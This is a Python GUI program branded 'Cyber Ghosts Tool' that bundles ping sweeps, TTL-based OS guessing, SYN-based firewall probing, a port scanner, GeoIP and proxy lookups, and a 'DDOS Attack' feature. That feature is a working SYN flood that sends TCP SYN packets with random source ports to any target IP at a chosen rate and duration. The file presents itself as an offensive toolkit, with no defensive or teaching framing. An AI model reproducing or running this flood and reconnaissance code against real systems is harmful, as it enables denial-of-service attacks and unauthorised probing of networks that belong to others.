import os
import threading
import time
import random
import socket
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
import ipaddress
import requests
from scapy.all import IP, TCP, ICMP, sr1, send, conf

# ---------- COLORS ----------
BG_COLOR = "#121212"
FG_COLOR = "#EEEEEE"
BTN_BG = "#1F2937"
BTN_FG = "#A5B4FC"
BTN_HOVER_BG = "#4338CA"
TEXT_BG = "#1E293B"
TEXT_FG = "#E0E7FF"

conf.verb = 0  # scapy quiet mode

# ----------- GUI Class -----------
class CyberGhostsTool(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Cyber Ghosts Tool")
        self.geometry("980x700")
        self.configure(bg=BG_COLOR)
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.create_widgets()

    def create_widgets(self):
        # Custom Banner
        banner_text = (
            "                      ___                                        ___             ___                \n"
            "                     (   )                                      (   )           (   )               \n"
            "  .--.     ___  ___   | |.-.      .--.    ___ .-.        .---.   | |     .-..    | | .-.     .---.  \n"
            " /    \\   (   )(   )  | /   \\   /     \\  (   )   \\      / .-, \\  | |    /    \\   | |/   \\   / .-, \\ \n"
            "|  .-. ;   | |  | |   |  .-. | (___)` . |  | ' .-. ;    (__) ; |  | |   ' .-,  ;  |  .-. .  (__) ; | \n"
            "|  |(___)  | |  | |   | |  | |    .-' /   |  / (___)     .'`  |  | |   | |  . |  | |  | |    .'`  | \n"
            "|  |       | '  | |   | |  | |    '. \\    | |           / .'| |  | |   | |  | |  | |  | |   / .'| | \n"
            "|  | ___   '  `-' |   | |  | |  ___ \\ '   | |          | /  | |  | |   | |  | |  | |  | |  | /  | | \n"
            "|  '(   )   `.__. |   | '  | | (   ) ; |  | |          ; |  ; |  | |   | |  ' |  | |  | |  ; |  ; | \n"
            "'  `-' |    ___ | |   ' `-' ;   \\ `-'  /  | |          ' `-'  |  | |   | `-'  '  | |  | |  ' `-'  | \n"
            " `.__,'    (   )' |    `.__.     ',__.'  (___)         `.__.'_. (___)  | \\__.'  (___)(___) `.__.'_. \n"
            "            ; `-' '                                                    | |                          \n"
            "             .__.'                                                    (___)                         \n"
            "\n[ Created by: CYBER GHOSTS ]"
        )

        banner = tk.Label(self, text=banner_text, font=("Consolas", 9), fg=BTN_FG, bg=BG_COLOR, justify="left")
        banner.pack(pady=5)

        # Buttons frame
        btn_frame = tk.Frame(self, bg=BG_COLOR)
        btn_frame.pack(pady=10)

        buttons = [
            ("Scan Network", self.scan_network_prompt),
            ("DDOS Attack", self.ddos_attack_prompt),
            ("Detect OS", self.detect_os_prompt),
            ("Detect Firewall", self.detect_firewall_prompt),
            ("Port Scan", self.port_scan_prompt),
            ("GeoIP Lookup", self.geoip_lookup_prompt),
            ("Proxy/VPN Check", self.proxy_vpn_check_prompt),
            ("Exit", self.quit),
        ]

        def on_enter(e): e.widget['background'] = BTN_HOVER_BG
        def on_leave(e): e.widget['background'] = BTN_BG

        for i, (text, cmd) in enumerate(buttons):
            row, col = divmod(i, 4)
            btn = tk.Button(btn_frame, text=text, width=20, font=("Consolas", 12, "bold"),
                            bg=BTN_BG, fg=BTN_FG, command=cmd,
                            activebackground=BTN_HOVER_BG, activeforeground="#FFFFFF")
            btn.grid(row=row, column=col, padx=8, pady=6)
            btn.bind("<Enter>", on_enter)
            btn.bind("<Leave>", on_leave)

        self.output_area = scrolledtext.ScrolledText(self, height=20, bg=TEXT_BG, fg=TEXT_FG,
                                                     font=("Consolas", 11), state='disabled')
        self.output_area.pack(fill="both", expand=True, padx=10, pady=10)

    def write_output(self, text):
        self.output_area.configure(state='normal')
        self.output_area.insert(tk.END, text + "\n")
        self.output_area.see(tk.END)
        self.output_area.configure(state='disabled')

    def clear_output(self):
        self.output_area.configure(state='normal')
        self.output_area.delete(1.0, tk.END)
        self.output_area.configure(state='disabled')

    def on_close(self):
        if messagebox.askokcancel("Quit", "Are you sure you want to exit?"):
            self.destroy()

    # --------- Feature Prompts and Threads -----------
    def scan_network_prompt(self):
        base_ip = simpledialog.askstring("Scan Network", "Enter base IP (e.g., 192.168.1):")
        if not base_ip: return
        self.clear_output()
        self.write_output(f"[SCAN] Scanning {base_ip}.0/24...")
        threading.Thread(target=self.scan_network, args=(base_ip,), daemon=True).start()

    def scan_network(self, base_ip):
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            pkt = IP(dst=ip)/ICMP()
            reply = sr1(pkt, timeout=1)
            if reply:
                self.write_output(f"[+] Host up: {ip}")

    def ddos_attack_prompt(self):
        ip = simpledialog.askstring("DDOS Attack", "Target IP:")
        dur = simpledialog.askinteger("Duration", "Seconds:", minvalue=1)
        rate = simpledialog.askinteger("Rate", "Packets/sec:", minvalue=1)
        if not ip or not dur or not rate: return
        self.clear_output()
        self.write_output(f"[DDoS] Attacking {ip} for {dur}s @ {rate} pps")
        threading.Thread(target=self.ddos_attack, args=(ip, dur, rate), daemon=True).start()

    def ddos_attack(self, ip, dur, rate):
        end = time.time() + dur
        sent = 0
        while time.time() < end:
            pkt = IP(dst=ip)/TCP(sport=random.randint(1024,65535), dport=80, flags="S")
            send(pkt)
            sent += 1
            if sent % rate == 0:
                self.write_output(f"[+] Packets sent: {sent}")
            time.sleep(1/rate)

    def detect_os_prompt(self):
        ip = simpledialog.askstring("Detect OS", "Enter IP:")
        if not ip: return
        self.clear_output()
        self.write_output(f"[OS] Detecting {ip}...")
        threading.Thread(target=self.detect_os, args=(ip,), daemon=True).start()

    def detect_os(self, ip):
        pkt = IP(dst=ip)/ICMP()
        reply = sr1(pkt, timeout=2)
        if reply:
            ttl = reply.ttl
            os = "Windows" if ttl >= 128 else "Linux/Unix" if ttl >= 64 else "Unknown"
            self.write_output(f"[OS] TTL={ttl} → {os}")
        else:
            self.write_output("[OS] No response")

    def detect_firewall_prompt(self):
        ip = simpledialog.askstring("Firewall", "Enter IP:")
        if not ip: return
        self.clear_output()
        self.write_output(f"[Firewall] Scanning {ip}...")
        threading.Thread(target=self.detect_firewall, args=(ip,), daemon=True).start()

    def detect_firewall(self, ip):
        pkt = IP(dst=ip)/TCP(dport=80, flags="S")
        reply = sr1(pkt, timeout=2)
        if not reply:
            self.write_output("[!] No reply - firewall or down")
        elif reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x14:
            self.write_output("[✓] Port closed")
        elif reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x12:
            self.write_output("[✓] Port open")
        else:
            self.write_output("[?] Unexpected response")

    def port_scan_prompt(self):
        ip = simpledialog.askstring("Port Scan", "Enter IP:")
        if not ip: return
        self.clear_output()
        self.write_output(f"[Scan] Ports on {ip}...")
        threading.Thread(target=self.port_scan, args=(ip,), daemon=True).start()

    def port_scan(self, ip):
        ports = [21,22,23,25,53,80,110,135,139,143,443,445,3306,3389,8080]
        for p in ports:
            with socket.socket() as s:
                s.settimeout(0.5)
                if s.connect_ex((ip, p)) == 0:
                    self.write_output(f"[OPEN] Port {p}")
                else:
                    self.write_output(f"[CLOSED] Port {p}")

    def geoip_lookup_prompt(self):
        ip = simpledialog.askstring("GeoIP", "Enter IP:")
        if not ip: return
        self.clear_output()
        threading.Thread(target=self.geoip_lookup, args=(ip,), daemon=True).start()

    def geoip_lookup(self, ip):
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}").json()
            if res["status"] == "success":
                self.write_output("\n".join([f"{k}: {v}" for k,v in res.items() if k in ["query","country","regionName","city","isp"]]))
            else:
                self.write_output("[GeoIP] Lookup failed")
        except Exception as e:
            self.write_output(f"[GeoIP] Error: {e}")

    def proxy_vpn_check_prompt(self):
        ip = simpledialog.askstring("Proxy/VPN Check", "Enter IP:")
        if not ip: return
        self.clear_output()
        threading.Thread(target=self.proxy_vpn_check, args=(ip,), daemon=True).start()

    def proxy_vpn_check(self, ip):
        try:
            res = requests.get(f"https://proxycheck.io/v2/{ip}?vpn=1&asn=1").json()
            if ip in res:
                status = res[ip].get("proxy", "unknown")
                self.write_output(f"[Proxy/VPN] Detected: {status}")
            else:
                self.write_output("[Proxy/VPN] No data")
        except Exception as e:
            self.write_output(f"[Proxy/VPN] Error: {e}")

if __name__ == "__main__":
    app = CyberGhostsTool()
    app.mainloop()
